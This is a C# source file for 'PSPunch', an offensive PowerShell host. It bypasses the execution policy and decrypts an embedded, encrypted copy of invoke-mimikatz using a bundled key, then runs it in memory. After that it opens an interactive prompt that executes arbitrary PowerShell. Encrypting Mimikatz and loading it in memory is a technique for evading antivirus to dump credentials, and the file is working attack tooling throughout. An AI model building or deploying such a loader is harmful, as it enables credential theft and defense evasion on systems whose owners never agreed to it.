using System;
using System.Configuration;
using System.Management.Automation.Runspaces;
using PSPunch.CryptUtil;
using System.IO;
using System.Text;
using System.Reflection;
using PSPunch.CmdProcessing;

namespace PSPunch
{
    class Program
    {
        static Runspace PSInit(PSPunchHost host)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace(host);
            runspace.Open();
            Processing.PSExec(runspace, host, "set-executionpolicy bypass -Scope process -Force");
            return runspace;

        }
        static void ImportModules(Runspace runspace, PSPunchHost host, Stream moduleStream)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            StreamReader keyReader = new StreamReader(assembly.GetManifestResourceStream("PSPunch.Modules.key.txt"));
            string key = keyReader.ReadToEnd();
            MemoryStream decMem = FileTools.DecryptFile(moduleStream, key);
            string module = Encoding.Unicode.GetString(decMem.ToArray());
            Processing.PSExec(runspace, host, module);
        }

        static void Main(string[] args)
        {
            string prompt = "PSPUNCH! #> ";
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.Clear();
            PSPunchHost host = new PSPunchHost();
            Runspace runspace = PSInit(host);
            Assembly assembly = Assembly.GetExecutingAssembly();
            Stream moduleStream = assembly.GetManifestResourceStream("PSPunch.Modules.invoke-mimikatz.ps1.enc");
            ImportModules(runspace, host, moduleStream);

            while (true)
            {
                PunchInput punchInput = new PunchInput();
                int consoleTopPos = Console.CursorTop;
                punchInput.loopPos = 0;
                punchInput.inLoop = false;
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write(prompt);
                Console.ForegroundColor = ConsoleColor.Yellow;
                punchInput.keyInfo = Console.ReadKey();
                while (punchInput.keyInfo.Key != ConsoleKey.Enter)
                {
                    punchInput = Processing.CommandProcessor(punchInput);
                    Console.SetCursorPosition(prompt.Length, consoleTopPos);
                    Console.Write(new string(' ', Console.WindowWidth));
                    Console.SetCursorPosition(prompt.Length, consoleTopPos);
                    Console.Write(punchInput.cmd);
                    punchInput.keyInfo = Console.ReadKey();
                }
                if (punchInput.cmd == "exit")
                {
                    return;
                }
                string output = Processing.PSExec(runspace, host, punchInput.cmd);
                Console.Write(output);
            }
        }
    }
}